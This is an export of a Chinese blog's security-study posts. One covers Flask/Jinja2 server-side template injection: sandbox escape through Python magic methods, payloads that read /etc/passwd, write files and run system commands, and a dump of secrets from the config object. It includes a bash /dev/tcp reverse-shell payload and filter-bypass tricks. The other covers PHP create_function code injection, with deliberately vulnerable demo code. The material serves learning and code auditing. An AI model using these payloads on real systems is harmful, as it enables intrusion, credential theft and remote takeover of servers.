<p><img src="/images/SSTI%E6%A8%A1%E6%9D%BF%E6%B3%A8%E5%85%A5%E5%AD%A6%E4%B9%A0.assets/image-20211112200107716.png" alt="image-20211112200107716"></p>
<p><img src="/images/SSTI%E6%A8%A1%E6%9D%BF%E6%B3%A8%E5%85%A5%E5%AD%A6%E4%B9%A0.assets/image-20211112200115816.png" alt="image-20211112200115816"></p>
</li>
</ul>
<p>注：SSTI与<code>render_template_string()</code> 函数密不可分</p>
<h3 id="SSTI原理"><a href="#SSTI原理" class="headerlink" title="SSTI原理"></a>SSTI原理</h3><p>测试demo：</p>
<figure class="highlight python"><table><tr><td class="code"><pre><span class="line"><span class="meta">@app.route(<span class="params"><span class="string">&#x27;/demo&#x27;</span></span>) </span><span class="comment">#测试demo</span></span><br><span class="line"><span class="function"><span class="keyword">def</span> <span class="title">ssti</span>():</span></span><br><span class="line">    html=<span class="string">&#x27;&#123;&#123;2*2&#125;&#125;&#x27;</span></span><br><span class="line">    <span class="keyword">return</span> flask.render_template_string(html)</span><br></pre></td></tr></table></figure>

<p>​    <img src="/images/SSTI%E6%A8%A1%E6%9D%BF%E6%B3%A8%E5%85%A5%E5%AD%A6%E4%B9%A0.assets/image-20211112200644606.png" alt="image-20211112200644606"></p>
<p>可以看到，demo路由下的2*2被<code>render_template_string()</code>渲染后执行了；</p>
<p>再让我们试一试<code>render_template()</code>的效果</p>
<figure class="highlight python"><table><tr><td class="code"><pre><span class="line"><span class="meta">@app.route(<span class="params"><span class="string">&#x27;/demo&#x27;</span></span>) </span><span class="comment">#测试demo</span></span><br><span class="line"><span class="function"><span class="keyword">def</span> <span class="title">ssti</span>():</span></span><br><span class="line">    html=<span class="string">&#x27;&#123;&#123;2*2&#125;&#125;&#x27;</span></span><br><span class="line">    <span class="keyword">return</span> flask.render_template(html)</span><br><span class="line"></span><br></pre></td></tr></table></figure>

<p><img src="/images/SSTI%E6%A8%A1%E6%9D%BF%E6%B3%A8%E5%85%A5%E5%AD%A6%E4%B9%A0.assets/image-20211112200908111.png" alt="image-20211112200908111"></p>
<p>可以看到环境500报错，这是由于render_template函数去寻找html变量所代表的的字符串所指向的模板去了，服务端找不到，返回500错误。</p>
<p><strong>为什么<code>&#123;&#123;xxxxx&#125;&#125;</code>内的语句会被执行？</strong></p>
<ul>
<li>这是由于flask框架中，渲染引擎jinja2将<code>&#123;&#123;---&#125;&#125;</code>视为变量标识符，会将其包含的内容作为变量处理，从而包含的语句被执行。</li>
</ul>
<h3 id="沙箱逃逸"><a href="#沙箱逃逸" class="headerlink" title="沙箱逃逸"></a>沙箱逃逸</h3><p>在上述demo中，虽说可以实现任意代码执行，但由于模板本身自带的沙盒安全机制，某些语句虽说可以执行，但会在执行中途被安全机制拦击。</p>
<p>​    <img src="/images/SSTI%E6%A8%A1%E6%9D%BF%E6%B3%A8%E5%85%A5%E5%AD%A6%E4%B9%A0.assets/image-20211112201454136.png" alt="image-20211112201454136"></p>
<p>即使在服务器端将os包含进去，但由于渲染时。模板引擎会对程序行为进行严格限制，导致无法执行命令</p>
<p>沙箱逃离流程</p>
<p><img src="/images/SSTI%E6%A8%A1%E6%9D%BF%E6%B3%A8%E5%85%A5%E5%AD%A6%E4%B9%A0.assets/image-20211112201647088.png" alt="image-20211112201647088"></p>
<p>借助的主要是各个类之间的继承关系</p>
<p>Python flask部分内建的魔术方法:</p>
<p><img src="/images/SSTI%E6%A8%A1%E6%9D%BF%E6%B3%A8%E5%85%A5%E5%AD%A6%E4%B9%A0.assets/image-20211112201854287.png" alt="image-20211112201854287"></p>
<ul>
<li><code>__class__</code>：主要用于查看变量所属的类，根据前面的变量形式可以得到其所属的类</li>
</ul>
<figure class="highlight python"><table><tr><td class="code"><pre><span class="line"><span class="meta">&gt;&gt;&gt; </span><span class="string">&#x27;&#x27;</span>.__class__</span><br><span class="line">&lt;<span class="class"><span class="keyword">class</span> &#x27;<span class="title">str</span>&#x27;&gt;</span></span><br><span class="line"><span class="class">&gt;&gt;&gt; ().<span class="title">__class__</span></span></span><br><span class="line"><span class="class">&lt;<span class="title">class</span> &#x27;<span class="title">tuple</span>&#x27;&gt;</span></span><br><span class="line"><span class="class">&gt;&gt;&gt; [].<span class="title">__class__</span></span></span><br><span class="line"><span class="class">&lt;<span class="title">class</span> &#x27;<span class="title">list</span>&#x27;&gt;</span></span><br><span class="line"><span class="class">&gt;&gt;&gt; &#123;&#125;.<span class="title">__class__</span></span></span><br><span class="line"><span class="class">&lt;<span class="title">class</span> &#x27;<span class="title">dict</span>&#x27;&gt;</span></span><br><span class="line"><span class="class">&gt;&gt;&gt; <span class="title">sum</span>.<span class="title">__class__</span></span></span><br><span class="line"><span class="class">&lt;<span class="title">class</span> &#x27;<span class="title">builtin_function_or_method</span>&#x27;&gt;</span></span><br></pre></td></tr></table></figure>

<ul>
<li><code>__base__</code>: 用于查看类的基类，也可是使用数组索引来引来查看特定位置的值</li>
</ul>
<figure class="highlight python"><table><tr><td class="code"><pre><span class="line"><span class="meta">&gt;&gt;&gt; </span><span class="string">&#x27;&#x27;</span>.__class__.__bases__</span><br><span class="line">(&lt;<span class="class"><span class="keyword">class</span> &#x27;<span class="title">object</span>&#x27;&gt;,)</span></span><br><span class="line"><span class="class">&gt;&gt;&gt; [].<span class="title">__class__</span>.<span class="title">__bases__</span></span></span><br><span class="line"><span class="class">(<span class="params">&lt;<span class="keyword">class</span> <span class="string">&#x27;object&#x27;</span>&gt;,</span>)</span></span><br><span class="line"><span class="class">&gt;&gt;&gt; &#123;&#125;.<span class="title">__class__</span>.<span class="title">__bases__</span></span></span><br><span class="line"><span class="class">(<span class="params">&lt;<span class="keyword">class</span> <span class="string">&#x27;object&#x27;</span>&gt;,</span>)</span></span><br><span class="line"><span class="class">&gt;&gt;&gt; &#x27;&#x27;.<span class="title">__class__</span>.<span class="title">__bases__</span></span></span><br><span class="line"><span class="class">(<span class="params">&lt;<span class="keyword">class</span> <span class="string">&#x27;object&#x27;</span>&gt;,</span>)</span></span><br><span class="line"><span class="class">&gt;&gt;&gt; [].<span class="title">__class__</span>.<span class="title">__bases__</span></span></span><br><span class="line"><span class="class">(<span class="params">&lt;<span class="keyword">class</span> <span class="string">&#x27;object&#x27;</span>&gt;,</span>)</span></span><br><span class="line"><span class="class">&gt;&gt;&gt; &#123;&#125;.<span class="title">__class__</span>.<span class="title">__bases__</span></span></span><br><span class="line"><span class="class">(<span class="params">&lt;<span class="keyword">class</span> <span class="string">&#x27;object&#x27;</span>&gt;,</span>)</span></span><br></pre></td></tr></table></figure>

<ul>
<li><code>__mro__</code>: 也可获得基类</li>
</ul>
<figure class="highlight python"><table><tr><td class="code"><pre><span class="line"><span class="meta">&gt;&gt;&gt; </span>().__class__.__mro__[<span class="number">1</span>]	<span class="comment">#利用索引拿到指定的信息</span></span><br><span class="line">&lt;<span class="class"><span class="keyword">class</span> &#x27;<span class="title">object</span>&#x27;&gt;</span></span><br><span class="line"><span class="class">&gt;&gt;&gt; ().<span class="title">__class__</span>.<span class="title">__mro__</span></span></span><br><span class="line"><span class="class">(<span class="params">&lt;<span class="keyword">class</span> <span class="string">&#x27;tuple&#x27;</span>&gt;, &lt;<span class="keyword">class</span> <span class="string">&#x27;object&#x27;</span>&gt;</span>)</span></span><br><span class="line"><span class="class">&gt;&gt;&gt; &#x27;&#x27;.<span class="title">__class__</span>.<span class="title">__mro__</span></span></span><br><span class="line"><span class="class">(<span class="params">&lt;<span class="keyword">class</span> <span class="string">&#x27;str&#x27;</span>&gt;, &lt;<span class="keyword">class</span> <span class="string">&#x27;object&#x27;</span>&gt;</span>)</span></span><br><span class="line"><span class="class">&gt;&gt;&gt; [].<span class="title">__class__</span>.<span class="title">__mro__</span></span></span><br><span class="line"><span class="class">(<span class="params">&lt;<span class="keyword">class</span> <span class="string">&#x27;list&#x27;</span>&gt;, &lt;<span class="keyword">class</span> <span class="string">&#x27;object&#x27;</span>&gt;</span>)</span></span><br><span class="line"><span class="class">&gt;&gt;&gt;</span></span><br></pre></td></tr></table></figure>

<p>SSTI利用主要是活用各种魔术方法</p>
<h3 id="引擎判断"><a href="#引擎判断" class="headerlink" title="引擎判断"></a>引擎判断</h3><p>服务端所使用的的各种引擎支持的语法是不同的</p>
<p>所以在找到SSTI注入点之后，我们首先应该先判断模板所使用的渲染引擎是什么，这样才能有针对性的构造对应引擎的Payload</p>
<p>通常可用以下payload进行测试:</p>
<p><img src="/images/SSTI%E6%A8%A1%E6%9D%BF%E6%B3%A8%E5%85%A5%E5%AD%A6%E4%B9%A0.assets/image-20211112203903757.png" alt="image-20211112203903757"></p>
<p>绿色表示执行成功，红色表示执行失败</p>
<p>注意:<code>&#123;&#123;7*7&#125;&#125;</code> 在Twig引擎中返回49，在Jinja2中返回7777777</p>
<h3 id="SSTI利用"><a href="#SSTI利用" class="headerlink" title="SSTI利用"></a>SSTI利用</h3><h4 id="xss"><a href="#xss" class="headerlink" title="xss"></a>xss</h4><figure class="highlight python"><table><tr><td class="code"><pre><span class="line"><span class="meta">@app.route(<span class="params"><span class="string">&#x27;/xss&#x27;</span></span>)</span></span><br><span class="line"><span class="function"><span class="keyword">def</span> <span class="title">xss</span>():</span></span><br><span class="line">    code = flask.request.args.get(<span class="string">&#x27;payload&#x27;</span>)</span><br><span class="line">    content = <span class="string">&#x27;&lt;p&gt;&#123;0&#125;&lt;/p&gt;&#x27;</span>.<span class="built_in">format</span>(code)</span><br><span class="line">    <span class="keyword">return</span> render_template_string(content)</span><br><span class="line"></span><br></pre></td></tr></table></figure>

<p>​    <img src="/images/SSTI%E6%A8%A1%E6%9D%BF%E6%B3%A8%E5%85%A5%E5%AD%A6%E4%B9%A0.assets/image-20211112205055945.png" alt="image-20211112205055945"></p>
<p>通过Flask库自带的request.args.get方法拿到get参数，并回传到页面之上。</p>
<h4 id="任意文件读写"><a href="#任意文件读写" class="headerlink" title="任意文件读写"></a>任意文件读写</h4><p>此处需要上述的魔术方法进行利用</p>
<figure class="highlight python"><table><tr><td class="code"><pre><span class="line"><span class="meta">@app.route(<span class="params"><span class="string">&#x27;/ssti&#x27;</span></span>)</span></span><br><span class="line"><span class="function"><span class="keyword">def</span> <span class="title">demo2</span>():</span></span><br><span class="line">    code = flask.request.args.get(<span class="string">&#x27;payload&#x27;</span>)</span><br><span class="line">    content = <span class="string">&#x27;&lt;p&gt;&#123;0&#125;&lt;/p&gt;&#x27;</span>.<span class="built_in">format</span>(code)</span><br><span class="line">    <span class="keyword">return</span> render_template_string(content)</span><br></pre></td></tr></table></figure>

<p>通过以下魔术方法的综合利用，读写任意文件:</p>
<ul>
<li>获取字符串的类对象</li>
</ul>
<figure class="highlight python"><table><tr><td class="code"><pre><span class="line"><span class="meta">&gt;&gt;&gt; </span><span class="string">&#x27;&#x27;</span>.__class__</span><br><span class="line">&lt;<span class="class"><span class="keyword">class</span> &#x27;<span class="title">str</span>&#x27;&gt;</span></span><br></pre></td></tr></table></figure>

<ul>
<li>寻找基类</li>
</ul>
<figure class="highlight python"><table><tr><td class="code"><pre><span class="line"><span class="meta">&gt;&gt;&gt; </span><span class="string">&#x27;&#x27;</span>.__class__.__mro__</span><br><span class="line">(&lt;<span class="class"><span class="keyword">class</span> &#x27;<span class="title">str</span>&#x27;&gt;, &lt;<span class="title">class</span> &#x27;<span class="title">object</span>&#x27;&gt;)</span></span><br></pre></td></tr></table></figure>

<ul>
<li>返回object的子类</li>
</ul>
<figure class="highlight python"><table><tr><td class="code"><pre><span class="line">__subclasses__()</span><br></pre></td></tr></table></figure>

<ul>
<li>以字典格式返回当前位置的全部全局变量</li>
</ul>
<figure class="highlight python"><table><tr><td class="code"><pre><span class="line">__globals__ 与func_globals等价</span><br></pre></td></tr></table></figure>

<ul>
<li>利用<code>__subclasses__()</code>方法寻找可用类</li>
</ul>
<figure class="highlight python"><table><tr><td class="code"><pre><span class="line"><span class="string">&#x27;&#x27;</span>.__class__.__mro__[<span class="number">2</span>].__subclasses__()</span><br><span class="line">小技巧: (<span class="string">&#x27;&#x27;</span>.__class__.__mro__[<span class="number">2</span>].__subclasses__()).index(file)可迅速定位索引我们所需要的的类位置</span><br></pre></td></tr></table></figure>

<p><img src="/images/SSTI%E6%A8%A1%E6%9D%BF%E6%B3%A8%E5%85%A5%E5%AD%A6%E4%B9%A0.assets/image-20211112210103765.png">    <img src="/images/SSTI%E6%A8%A1%E6%9D%BF%E6%B3%A8%E5%85%A5%E5%AD%A6%E4%B9%A0.assets/image-20211113112306415.png" alt="image-20211113112306415"></p>
<p>通过基类引出可用引用，可以在其中发现一个&lt;type ‘file’&gt;</p>
<ul>
<li>构造读取文件payload:</li>
</ul>
<figure class="highlight python"><table><tr><td class="code"><pre><span class="line">(<span class="string">&#x27;&#x27;</span>.__class__.__mro__[<span class="number">2</span>].__subclasses__())[<span class="number">40</span>](<span class="string">&#x27;C:\\Users\\86156\\Desktop\\test.txt&#x27;</span>).read()</span><br></pre></td></tr></table></figure>

<p><img src="/images/SSTI%E6%A8%A1%E6%9D%BF%E6%B3%A8%E5%85%A5%E5%AD%A6%E4%B9%A0.assets/image-20211113112917262.png" alt="image-20211113112917262"></p>
<p>也可利用<code>__bases__</code>、<code>object.__subclasses__()</code>进行调用</p>
<figure class="highlight python"><table><tr><td class="code"><pre><span class="line">()..__class__.__bases__[<span class="number">0</span>].__subclasses__()[<span class="number">40</span>](<span class="string">&#x27;/etc/passwd&#x27;</span>).read()</span><br><span class="line"><span class="built_in">object</span>.__subclasses__()[<span class="number">40</span>](<span class="string">&#x27;/etc/passwd&#x27;</span>).read()</span><br></pre></td></tr></table></figure>

<p><strong>写文件</strong></p>
<figure class="highlight python"><table><tr><td class="code"><pre><span class="line">().__class__.__bases__[<span class="number">0</span>].__subclasses__()[<span class="number">40</span>](<span class="string">&#x27;C:\\Users\\86156\\Desktop\\test.txt&#x27;</span>,<span class="string">&#x27;w&#x27;</span>).write(<span class="string">&#x27;i am render template inject!&#x27;</span>)</span><br></pre></td></tr></table></figure>

<figure class="highlight plaintext"><table><tr><td class="code"><pre><span class="line">&#x27;&#x27;.__class__.__mro__[2].__subclasses__()[40](&#x27;C:\\Users\\86156\\Desktop\\test.txt&#x27;,&#x27;w&#x27;).write(&#x27;i am Lihua&#x27;)</span><br></pre></td></tr></table></figure>

<figure class="highlight python"><table><tr><td class="code"><pre><span class="line"><span class="built_in">object</span>.__class__.__mro__[<span class="number">1</span>].__subclasses__()[<span class="number">40</span>](<span class="string">&#x27;C:\\Users\\86156\\Desktop\\test.txt&#x27;</span>,<span class="string">&#x27;w&#x27;</span>).write(<span class="string">&#x27;Object&#x27;</span>)</span><br></pre></td></tr></table></figure>

<p><img src="/images/SSTI%E6%A8%A1%E6%9D%BF%E6%B3%A8%E5%85%A5%E5%AD%A6%E4%B9%A0.assets/image-20211113114225347.png" alt="image-20211113114225347"></p>
<p><strong>任意代码执行</strong></p>
<p>思路与任意文件读取十分类似，通过基类拿到os模块，调用系统命令即可。</p>
<p>payload:</p>
<figure class="highlight python"><table><tr><td class="code"><pre><span class="line">&#123;&#123;config.__class__.__init__.__globals__[<span class="string">&#x27;os&#x27;</span>].popen(<span class="string">&#x27;whoami&#x27;</span>).read()&#125;&#125;</span><br><span class="line"><span class="string">&#x27;&#x27;</span>.__class__.__mro__[<span class="number">2</span>].__subclasses__()[<span class="number">71</span>].__init__.__globals__[<span class="string">&#x27;os&#x27;</span>].system(<span class="string">&#x27;ls&#x27;</span>)</span><br><span class="line"><span class="string">&#x27;&#x27;</span>.__class__.__mro__[<span class="number">2</span>].__subclasses__()[<span class="number">71</span>].__init__.__globals__[<span class="string">&#x27;os&#x27;</span>].popen(<span class="string">&#x27;ls&#x27;</span>).read()</span><br><span class="line"></span><br><span class="line"><span class="comment"># eval</span></span><br><span class="line"><span class="string">&#x27;&#x27;</span>.__class__.__mro__[<span class="number">2</span>].__subclasses__()[<span class="number">59</span>].__init__.__globals__[<span class="string">&#x27;__builtins__&#x27;</span>][<span class="string">&#x27;eval&#x27;</span>](<span class="string">&quot;__import__(&#x27;os&#x27;).popen(&#x27;id&#x27;).read()&quot;</span>)</span><br><span class="line"><span class="string">&#x27;&#x27;</span>.__class__.__mro__[<span class="number">2</span>].__subclasses__()[<span class="number">59</span>].__init__.__globals__.__builtins__.<span class="built_in">eval</span>(<span class="string">&quot;__import__(&#x27;os&#x27;).popen(&#x27;id&#x27;).read()&quot;</span>)</span><br><span class="line">().__class__.__bases__[<span class="number">0</span>].__subclasses__()[<span class="number">59</span>].__init__.func_globals.values()[<span class="number">13</span>][<span class="string">&#x27;eval&#x27;</span>](<span class="string">&#x27;__import__(&quot;os&quot;).popen(&quot;ls  /var/www/html&quot;).read()&#x27;</span> )</span><br><span class="line"><span class="built_in">object</span>.__subclasses__()[<span class="number">59</span>].__init__.func_globals.values()[<span class="number">13</span>][<span class="string">&#x27;eval&#x27;</span>](<span class="string">&#x27;__import__(&quot;os&quot;).popen(&quot;ls  /var/www/html&quot;).read()&#x27;</span> )</span><br><span class="line"></span><br><span class="line"><span class="comment">#__import__</span></span><br><span class="line"><span class="string">&#x27;&#x27;</span>.__class__.__mro__[<span class="number">2</span>].__subclasses__()[<span class="number">59</span>].__init__.__globals__.__builtins__.<span class="built_in">__import__</span>(<span class="string">&#x27;os&#x27;</span>).popen(<span class="string">&#x27;id&#x27;</span>).read()</span><br><span class="line"><span class="string">&#x27;&#x27;</span>.__class__.__mro__[<span class="number">2</span>].__subclasses__()[<span class="number">59</span>].__init__.__globals__[<span class="string">&#x27;__builtins__&#x27;</span>][<span class="string">&#x27;__import__&#x27;</span>](<span class="string">&#x27;os&#x27;</span>).popen(<span class="string">&#x27;id&#x27;</span>).read()</span><br><span class="line"></span><br></pre></td></tr></table></figure>

<p><img src="/images/SSTI%E6%A8%A1%E6%9D%BF%E6%B3%A8%E5%85%A5%E5%AD%A6%E4%B9%A0.assets/image-20211113122531519.png" alt="image-20211113122531519"></p>
<p><strong>反弹shell</strong></p>
<figure class="highlight python"><table><tr><td class="code"><pre><span class="line"><span class="string">&#x27;&#x27;</span>.__class__.__mro__[<span class="number">2</span>].__subclasses__()[<span class="number">71</span>].__init__.__globals__[<span class="string">&#x27;os&#x27;</span>].popen(<span class="string">&#x27;bash -i &gt;&amp; /dev/tcp/你的服务器地址/端口 0&gt;&amp;1&#x27;</span>).read()</span><br><span class="line"></span><br></pre></td></tr></table></figure>

<p>这个 Payload 不能直接放在 URL 中执行 , 因为 <code>&amp;</code> 的存在会导致 URL 解析出现错误,自然也可使用nc进行反弹shell，且无需编码<br> 可以使用 BurpSuite 等工具构造数据包再发送</p>
<p><img src="/images/SSTI%E6%A8%A1%E6%9D%BF%E6%B3%A8%E5%85%A5%E5%AD%A6%E4%B9%A0.assets/image-20211113123000881.png" alt="image-20211113123000881"></p>
<p><strong>获取服务器环境信息</strong></p>
<p>可利用语句获得部分服务器配置信息，如<code>SERVER_SOFTWARE</code>服务平台</p>
<ul>
<li></li>
</ul>
<p><img src="/images/SSTI%E6%A8%A1%E6%9D%BF%E6%B3%A8%E5%85%A5%E5%AD%A6%E4%B9%A0.assets/image-20211113123437182.png" alt="image-20211113123437182"></p>
<ul>
<li>config.items</li>
</ul>
<figure class="highlight html"><table><tr><td class="code"><pre><span class="line">http://127.0.0.1:5000/xss?payload=&#123;&#123;config&#125;&#125;</span><br></pre></td></tr></table></figure>

<p>一个类字典的对象，包含了所有应用程序的配置值</p>
<p>在大多数情况下 , 它包含了比如数据库链接字符串 , 连接到第三方的凭证 , SECRET_KEY等敏感值</p>
<p><img src="/images/SSTI%E6%A8%A1%E6%9D%BF%E6%B3%A8%E5%85%A5%E5%AD%A6%E4%B9%A0.assets/image-20211113124027351.png" alt="image-20211113124027351"></p>
<h4 id="沙箱绕过方式"><a href="#沙箱绕过方式" class="headerlink" title="沙箱绕过方式"></a>沙箱绕过方式</h4><p><strong>过滤小括号</strong></p>
<p>利用python自带的内置函数</p>
<ul>
<li>get_flashed_messages()</li>
<li>url_for()</li>
</ul>
<p>payload</p>
<figure class="highlight plaintext"><table><tr><td class="code"><pre><span class="line">&#123;&#123;get_flashed.messages.__globals__&#125;&#125;</span><br></pre></td></tr></table></figure>

<p><strong>访问变量属性方式</strong></p>
<p>利用<code>.</code>拼接访问</p>
<figure class="highlight plaintext"><table><tr><td class="code"><pre><span class="line">&#123;&#123;&#x27;&#x27;.__class__&#125;&#125;</span><br></pre></td></tr></table></figure>

<p>使用<code>[]</code>访问</p>
<figure class="highlight plaintext"><table><tr><td class="code"><pre><span class="line">&#123;&#123;&#x27;&#x27;[&#x27;__class__&#x27;]&#125;&#125;</span><br></pre></td></tr></table></figure>

<p>这两种访问方式完全等价，可用于不严格的过滤</p>
<p><img src="/images/SSTI%E6%A8%A1%E6%9D%BF%E6%B3%A8%E5%85%A5%E5%AD%A6%E4%B9%A0.assets/image-20211113130142634.png" alt="image-20211113130142634"></p>
<p>所以说，即便网站过滤点，我们还可使用中括号绕过</p>
<p>如果想要调用字典的键值，其本质是调用了魔术方法<code>__getitem__</code></p>
<p>所以在取字典中的键值时，不仅可以使用<code>[]</code>还可使用<code>__getitem__</code></p>
<p>对于字典来说，我们也可以使用他自带的一些方法来调用其中的值，比如说<code>pop</code>方法</p>
<figure class="highlight python"><table><tr><td class="code"><pre><span class="line">pop(key[,default])</span><br><span class="line">参数</span><br><span class="line">key: 要删除的键值</span><br><span class="line">default: 如果没有 key，返回 default 值</span><br><span class="line">删除字典给定键 key 所对应的值，返回值为被删除的值。key值必须给出。 否则，返回default值。</span><br></pre></td></tr></table></figure>

<p>但是此方法会将字典中的键值删除，如果删除的是服务器关键参数，将会使得服务器崩溃，因此并不推荐其使用</p>
<p><img src="/images/SSTI%E6%A8%A1%E6%9D%BF%E6%B3%A8%E5%85%A5%E5%AD%A6%E4%B9%A0.assets/image-20211113132357745.png" alt="image-20211113132357745"></p>
<p><strong>如果我们需要使用字典中的键值时</strong>，可以调用<code>dict.get(&#39;key&#39;) dict.setdefault(&#39;key&#39;)</code>获得键值</p>
<p><img src="/images/SSTI%E6%A8%A1%E6%9D%BF%E6%B3%A8%E5%85%A5%E5%AD%A6%E4%B9%A0.assets/image-20211113132557089.png" alt="image-20211113132557089"></p>
]]></content>
      <categories>
        <category>代码审计</category>
      </categories>
      <tags>
        <tag>代码审计</tag>
      </tags>
  </entry>
  <entry>
    <title>PHP代码审计学习-3</title>
    <url>/2021/10/25/PHP%E4%BB%A3%E7%A0%81%E5%AE%A1%E8%AE%A1%E5%AD%A6%E4%B9%A0-3/</url>
    <content><![CDATA[<h3 id="动态函数执行和匿名函数执行"><a href="#动态函数执行和匿名函数执行" class="headerlink" title="动态函数执行和匿名函数执行"></a>动态函数执行和匿名函数执行</h3><h4 id="动态函数执行"><a href="#动态函数执行" class="headerlink" title="动态函数执行"></a>动态函数执行</h4><p>函数与函数之间的调用，可能会产生漏洞。</p>
<p>测试demo</p>
<figure class="highlight php"><table><tr><td class="code"><pre><span class="line"><span class="meta">&lt;?php</span></span><br><span class="line"><span class="function"><span class="keyword">function</span> <span class="title">a</span>(<span class="params"></span>)</span>&#123;</span><br><span class="line">    <span class="keyword">echo</span> <span class="string">&quot;a&quot;</span>;</span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line"><span class="function"><span class="keyword">function</span> <span class="title">b</span>(<span class="params"></span>)</span>&#123;</span><br><span class="line">    <span class="keyword">echo</span> <span class="string">&quot;b&quot;</span>;</span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line"><span class="function"><span class="keyword">function</span> <span class="title">c</span>(<span class="params"><span class="variable">$args1</span>,<span class="variable">$args2</span></span>)</span>&#123;</span><br><span class="line">    <span class="variable">$args1</span>(<span class="variable">$args2</span>);</span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line"><span class="variable">$action</span>=<span class="variable">$_GET</span>[<span class="string">&#x27;action&#x27;</span>];</span><br><span class="line"><span class="variable">$cmd</span>=<span class="variable">$_GET</span>[<span class="string">&#x27;cmd&#x27;</span>];</span><br><span class="line">c(<span class="variable">$action</span>,<span class="variable">$cmd</span>);</span><br><span class="line"><span class="comment">//浏览器获取到的值 b ，现在作为 c() 函数的参数插入到了函数中，并且在函数中作为函数名调用了另外一个函数</span></span><br><span class="line"><span class="meta">?&gt;</span></span><br></pre></td></tr></table></figure>

<p><img src="/images/PHP%E4%BB%A3%E7%A0%81%E5%AE%A1%E8%AE%A1%E5%AD%A6%E4%B9%A0-3.assets/image-20211025160512247.png" alt="image-20211025160512247"></p>
<span id="more"></span>

<p>利用<code>$action</code>、<code>$cmd</code> 动态传递参数，执行命令</p>
<h4 id="匿名函数-Anonymous-functions"><a href="#匿名函数-Anonymous-functions" class="headerlink" title="匿名函数(Anonymous functions)"></a>匿名函数(Anonymous functions)</h4><p>也被称之为闭包函数(closures)，允许临时创建一个没有指定名称的函数。最经常用作回调函数(callback)参数的值</p>
<p>测试demo</p>
<figure class="highlight php"><table><tr><td class="code"><pre><span class="line"><span class="meta">&lt;?php</span></span><br><span class="line">error_reporting(<span class="number">0</span>);</span><br><span class="line"><span class="variable">$sort_by</span> = <span class="variable">$_GET</span>[<span class="string">&#x27;sort_by&#x27;</span>]; <span class="comment">//GET方式传入值</span></span><br><span class="line"><span class="variable">$sorter</span> = <span class="string">&#x27;strnatcasecmp&#x27;</span>; <span class="comment">//strnatcasecmp 用于 比较字符串大小</span></span><br><span class="line"><span class="variable">$databases</span>=<span class="keyword">array</span>(<span class="string">&#x27;1234&#x27;</span>,<span class="string">&#x27;4321&#x27;</span>);</span><br><span class="line"><span class="variable">$sort_function</span> = <span class="string">&#x27; return 1 * &#x27;</span> . <span class="variable">$sorter</span> . <span class="string">&#x27;($a[&quot;&#x27;</span> . <span class="variable">$sort_by</span> . <span class="string">&#x27;&quot;], $b[&quot;&#x27;</span> . <span class="variable">$sort_by</span> . <span class="string">&#x27;&quot;]);&#x27;</span>; <span class="comment">//return 1*(0/1)</span></span><br><span class="line"><span class="keyword">echo</span> <span class="string">&#x27;this is test&#x27;</span>;</span><br><span class="line">usort(<span class="variable">$databases</span>, create_function(<span class="string">&#x27;$a, $b&#x27;</span>, <span class="variable">$sort_function</span>)); <span class="comment">//此处创建一个匿名函数 $a $b作为参数传给$sort_function</span></span><br><span class="line"><span class="comment">//// 匿名函数相当于隐式函数大概内内部是如此，我们可以将传参的$sort_by 做一些处理，比如说闭合，使其能拼接执行恶意代码</span></span><br><span class="line"><span class="comment">//function xxx($a,$b)&#123;</span></span><br><span class="line"><span class="comment">//    return 1*strnatcasecmp($a[&quot;&quot;]);&#125;phpinfo();/*,$b[&#x27;2&#x27;]);</span></span><br><span class="line"><span class="comment">//&#125;</span></span><br><span class="line"><span class="comment">//echo &#x27;nayon&#x27;;</span></span><br><span class="line"><span class="meta">?&gt;</span></span><br><span class="line"></span><br><span class="line"></span><br></pre></td></tr></table></figure>

<p>匿名函数create_function()在其中创建的函数大概为如下所示</p>
<figure class="highlight plaintext"><table><tr><td class="code"><pre><span class="line">function xxx($a,$b)&#123;</span><br><span class="line">    return 1*strnatcasecmp($a[&quot;1&quot;],$b[&#x27;2&#x27;]);</span><br><span class="line">&#125;</span><br><span class="line">echo &#x27;nayon&#x27;;</span><br><span class="line">?&gt;</span><br><span class="line"></span><br></pre></td></tr></table></figure>

<p>利用<code>&#125;</code>闭合匿名函数，继续写上恶意代码，然后再/*注释掉垃圾字符。</p>
<p>由此我们可以拼接出利用payload:</p>
<figure class="highlight php"><table><tr><td class="code"><pre><span class="line">sort_by=<span class="string">&#x27;&quot;]);&#125;phpinfo();/*</span></span><br></pre></td></tr></table></figure>

<p><img src="/images/PHP%E4%BB%A3%E7%A0%81%E5%AE%A1%E8%AE%A1%E5%AD%A6%E4%B9%A0-3.assets/image-20211025163501429.png" alt="image-20211025163501429"></p>
<p>测试demo：</p>
<figure class="highlight php"><table><tr><td class="code"><pre><span class="line"><span class="meta">&lt;?php</span></span><br><span class="line"><span class="variable">$c</span>=<span class="variable">$_GET</span>[<span class="string">&#x27;c&#x27;</span>];</span><br><span class="line"><span class="variable">$lambda</span>=create_function(<span class="string">&#x27;$a,$b&#x27;</span>,<span class="string">&quot;return (strlen(<span class="subst">$a</span>)-strlen(<span class="subst">$b</span>)+&quot;</span> . <span class="string">&quot;strlen(<span class="subst">$c</span>));&quot;</span>);</span><br><span class="line"><span class="variable">$array</span>=<span class="keyword">array</span>(<span class="string">&#x27;reall long string here,boy&#x27;</span>,<span class="string">&#x27;this&#x27;</span>,<span class="string">&#x27;midding lenth&#x27;</span>,<span class="string">&#x27;larget&#x27;</span>);</span><br><span class="line">usort(<span class="variable">$array</span>,<span class="variable">$lambda</span>);</span><br><span class="line">print_r(<span class="variable">$array</span>);</span><br><span class="line"><span class="meta">?&gt;</span></span><br></pre></td></tr></table></figure>

<p><code>$c</code>处未存在过滤,可构造payload：</p>
<figure class="highlight plaintext"><table><tr><td class="code"><pre><span class="line">payload1:3));&#125;phpinfo();/* #/用于注释多出的));以及匿名函数所会生成的&#125;</span><br><span class="line">payload2:3));&#125;phpinfo();&#123;((1 #利用&#123; 和((将多出的字符闭合</span><br></pre></td></tr></table></figure>

<p>匿名函数中大概这样，进行执行phpinfo</p>
